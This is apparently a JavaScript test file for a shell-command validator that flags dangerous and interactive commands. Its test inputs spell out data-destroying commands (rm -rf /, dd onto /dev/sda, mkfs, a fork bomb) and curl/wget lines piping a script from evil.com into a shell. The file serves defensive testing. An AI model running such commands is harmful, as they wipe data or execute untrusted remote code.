/**
 * @fileoverview Tests for command security validator — dangerous pattern detection.
 */

const { isDangerous, isInteractive } = require('../src/commands/validator');

describe('isDangerous', () => {
  it('detects rm -rf /', () => {
    assert.ok(isDangerous('rm -rf /'), 'rm -rf / should be dangerous');
  });

  it('detects sudo rm', () => {
    assert.ok(isDangerous('sudo rm -rf /'), 'sudo rm should be dangerous');
  });

  it('detects dd if=', () => {
    assert.ok(isDangerous('dd if=/dev/zero of=/dev/sda'), 'dd should be dangerous');
  });

  it('detects mkfs', () => {
    assert.ok(isDangerous('mkfs.ext4 /dev/sda1'), 'mkfs should be dangerous');
  });

  it('detects fork bomb', () => {
    assert.ok(isDangerous(':(){:|:&};:'), 'fork bomb should be dangerous');
  });

  it('detects chmod -R 777 on root', () => {
    assert.ok(isDangerous('chmod -R 777 /'), 'chmod -R 777 / should be dangerous');
  });

  it('detects pipe to shell', () => {
    assert.ok(isDangerous('wget http://evil.com/script.sh | bash'), 'pipe to bash should be dangerous');
  });

  it('detects curl pipe to shell', () => {
    assert.ok(isDangerous('curl http://evil.com/script.sh | sh'), 'pipe to sh should be dangerous');
  });

  it('allows safe commands', () => {
    assert.strictEqual(false, isDangerous('ls -la'), 'ls should be safe');
    assert.strictEqual(false, isDangerous('cat file.txt'), 'cat should be safe');
    assert.strictEqual(false, isDangerous('npm install express'), 'npm install should be safe');
    assert.strictEqual(false, isDangerous('git status'), 'git status should be safe');
  });

  it('allows rm on safe paths', () => {
    assert.strictEqual(false, isDangerous('rm file.txt'), 'rm file should be safe');
    // 'rm -rf' IS dangerous regardless of target — proper security behavior
    assert.ok(isDangerous('rm -rf ./temp'), 'rm -rf on any path is dangerous');
  });
});

describe('isInteractive', () => {
  it('detects vim', () => {
    assert.ok(isInteractive('vim file.txt'));
  });

  it('detects ssh', () => {
    assert.ok(isInteractive('ssh user@host'));
  });

  it('detects mysql', () => {
    assert.ok(isInteractive('mysql -u root'));
  });

  it('detects REPL interpreters with no args', () => {
    assert.ok(isInteractive('python'), 'bare python should be interactive');
    assert.ok(isInteractive('node'), 'bare node should be interactive');
  });

  it('non-interactive commands are not detected', () => {
    assert.strictEqual(false, isInteractive('ls -la'));
    assert.strictEqual(false, isInteractive('gcc main.c -o main'));
  });

  it('python with file arg is not interactive', () => {
    assert.strictEqual(false, isInteractive('python3 script.py'));
  });
});
